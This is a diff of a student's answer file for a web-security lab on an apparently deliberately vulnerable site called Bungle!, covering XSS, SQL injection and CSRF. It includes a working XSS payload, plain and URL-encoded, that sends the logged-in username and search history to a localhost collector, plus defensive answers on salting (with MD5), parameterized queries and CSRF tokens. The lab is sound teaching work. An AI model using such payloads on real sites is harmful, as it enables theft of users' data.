@@ -16,7 +16,7 @@ Part 1: Cross-site Scripting (XSS)
 
 	1.0) Payload (JavaScript/jQuery):
 	<script>document.addEventListener("DOMContentLoaded", function(){var url = "http://localhost:31337/stolen?user=" + document.getElementById("logged-in-user").innerText + "&last_search=" + document.getElementsByClassName("history-item list-group-item")[1].innerText; window.location.href=url},false);</script>
-	
+
 	1.0) No defense
 
 		http://0.0.0.0:8080/search?xssdefense=0&q=<script>document.addEventListener%28%22DOMContentLoaded%22%2C%20function%28%29%7Bvar%20url%20%3D%20%22http%3A%2F%2Flocalhost%3A31337%2Fstolen%3Fuser%3D%22%20%2B%20document.getElementById%28%22logged-in-user%22%29.innerText%20%2B%20%22%26last_search%3D%22%20%2B%20document.getElementsByClassName%28%22history-item%20list-group-item%22%29%5B1%5D.innerText%3B%20window.location.href%3Durl%7D%2Cfalse%29%3B</script>
@@ -113,16 +113,16 @@ Part 4: Better Defenses
 
 	4.1) Briefly describe how you implemented password salting and hashing
 
-		TODO
-
+        So in the database.py file, at first I use os.urandom(20) to create a random salt (this salt is different for each user). I change the database table for users so it's no longer (username, password) but (username, salt, key) where the key is the hash generated from the password concateanated with the salt. Then when the user logs in, using their username, I retrieve the salt, and use the same md5 algorithm to arrive at the hash, which I compare against the key in the database to
+        validate the user.
 
 	4.2) Briefly describe the changes you made to database.py to prevent SQL injection attacks
 
 		To prevent the SQL injection attack proposed, a solution is to use a parameterized query
 		by replacing the variables(username and password) with question marks, notifying that the
-		variables are parameters. And as described in "Database Tips", "the database API can then 
+		variables are parameters. And as described in "Database Tips", "the database API can then
 		be used to set the parameters before executing the query."
-		
+
 		Change the following line in validateUser(username, password) for database.py:
 		"cur.execute("SELECT * FROM users WHERE username='{}' AND password='{}'".format(username, password))"
 		into the following:
@@ -156,8 +156,8 @@ Part 4: Better Defenses
 	4.4) In 1-2 paragraphs, provide some advice to the Bunglers about how they should
 	     strengthen Bungle!'s defenses to prevent CSRF attacks
 
-	     	TODO
-
+        So in our exercises, when there is no XSS defense and no CSRF token required, the attack happens because the attacker could trick the user into clicking a link that would perform a post request to the log in site with the username/password controlled by the attacker. This makes the user vulnerable because the attacker can observe their behaviors. When there is CSRF token and no XSS defense, the attacker could take advantage of the XSS vulnerability to extract the CSRF token and make
+        the user log in. The Bunglers should enable XSS defense (sanitizing recursively tags, scripts, characters such as <, >, ; , ', ",...). This should limit the attackers' exploit of XSS vulnerability. Secondly, The Bunglers should enable CSRF token. With these 2 defenses in place, CSRF attacks are limited.
 
 ________________________________________________________________________________________
 
@@ -167,7 +167,7 @@ Additional Questions
 	Q1 (ungraded). How did you divide the work between partners? (Put N/A if worked alone)
 
 		We divided up the work so that we each worked on different attacks while reviewing
-		each other's work and offering suggestions.
+		each other's work and offering suggestions. Chase works on Part 1 and 3 primarily and Bao works on part 2 and 4 primarily.
 
 
 	Q2 (optional, ungraded). Did you use code snippets from anywhere online that you need to cite?
